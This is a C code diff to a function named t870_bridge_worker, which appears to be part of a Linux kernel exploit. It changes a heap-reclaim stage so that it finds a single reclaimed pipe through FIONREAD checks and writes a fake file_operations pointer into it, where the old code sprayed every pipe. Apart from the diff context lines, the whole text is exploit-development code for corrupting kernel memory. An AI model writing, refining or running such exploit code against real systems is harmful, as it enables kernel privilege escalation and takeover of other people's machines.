@@ -102,7 +102,9 @@ int t870_bridge_worker(void *opaque)
     struct t870_bridge_resources *resources;
     unsigned char safe_map[T870_CMSG_CONTROL_SIZE];
     unsigned char pipe_write[T870_CMSG_CONTROL_SIZE];
+    unsigned int reclaimed_pipe = 0;
     unsigned int count;
+    int matches;
     int arm_result;
 
     if (context == NULL || !validate_inputs(&context->inputs) ||
@@ -169,14 +171,21 @@ int t870_bridge_worker(void *opaque)
     if (count != T870_CMSG_WAVE_SENDERS)
         return dirty_failure(context, "second-wave");
 
-    count = t870_pipe_wave_write_all(
-        &resources->pipes, &context->inputs.fake_fops,
-        sizeof(context->inputs.fake_fops));
-    printf("[*] bridge fake-fops write attempts=%u/%u target=%016" PRIx64
-           " value=%016" PRIx64 "\n", count, T870_PIPE_WAVE_COUNT,
+    matches = t870_pipe_wave_find_zero_length(
+        &resources->pipes, &reclaimed_pipe);
+    printf("[*] bridge second reclaim FIONREAD matches=%d expected=1 "
+           "candidate=%u normal_bytes=%u\n", matches, reclaimed_pipe,
+           3U * T870_PIPE_WAVE_PAGE_SIZE);
+    if (matches != 1)
+        return dirty_failure(context, "second-reclaim-checkpoint");
+
+    if (t870_pipe_wave_write_one(
+            &resources->pipes, reclaimed_pipe, &context->inputs.fake_fops,
+            sizeof(context->inputs.fake_fops)) != 0)
+        return dirty_failure(context, "target-write");
+    printf("[*] bridge fake-fops write pipe=%u target=%016" PRIx64
+           " value=%016" PRIx64 "\n", reclaimed_pipe,
            context->inputs.misc_fops_direct, context->inputs.fake_fops);
-    if (count != T870_PIPE_WAVE_COUNT)
-        return dirty_failure(context, "write-all");
 
     if (!context->hooks.verify_original_route(context->hooks.opaque))
         return dirty_failure(context, "original-route-verification");
